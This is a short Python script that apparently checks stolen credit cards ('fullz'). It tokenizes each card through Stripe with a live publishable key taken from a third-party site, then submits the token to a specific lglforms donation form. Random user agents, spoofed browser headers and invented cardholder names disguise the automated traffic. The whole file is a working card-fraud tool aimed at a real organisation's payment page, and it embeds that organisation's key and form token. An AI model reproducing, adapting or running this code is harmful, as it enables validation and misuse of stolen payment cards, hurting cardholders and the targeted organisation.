import asyncio
import random
import uuid
from fake_useragent import UserAgent
from httpx import AsyncClient , HTTPError , ProxyError
from FUNC.defs import *

async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        random_data = await get_random_info(session)
        first_name = random_data["fname"]
        last_name = random_data["lname"]

        url = "https://api.stripe.com/v1/tokens"

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': UserAgent().random,
        }

        data = {
            'card[name]': f'{first_name} {last_name}',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js/7b85fe0599; stripe-js-v3/7b85fe0599; split-card-element',
            'referrer': 'https://secure.lglforms.com',
            'time_on_page': str(random.randint(10000, 99999)),
            'key': 'pk_live_rTiTqQbBYWYhaIZjd27CKeRB00i9MfC61E',
        }

        result = await session.post(url, headers=headers, data=data)
        try:
            payment_method_id = result.json()["id"]
        except:
            return result.text
        
        url = "https://secure.lglforms.com/form_engine/r/eb85c788-4a94-4de9-8ae4-42b32eb42364/scapture"
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://secure.lglforms.com',
            'Referer': 'https://secure.lglforms.com/form_engine/r/eb85c788-4a94-4de9-8ae4-42b32eb42364/finalize',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': UserAgent().random,
        }

        data = {
            'utf8': '✓',
            'authenticity_token': '+akQxZ0QMDG6MxBaSrQWijOR57Ro9TZrVWPzPsTCQZlAbW1gJW5k0zZ2vIbiFSSeBvUvGqWWfh9PEEuXtSaW0A==',
            'cc-name': f'{first_name} {last_name}',
            'stripeToken': payment_method_id,
        }

        result = await session.post(
            url=url,
            headers=headers,
            data=data,
        )
        return result.text
    except Exception as e:
        return str(e)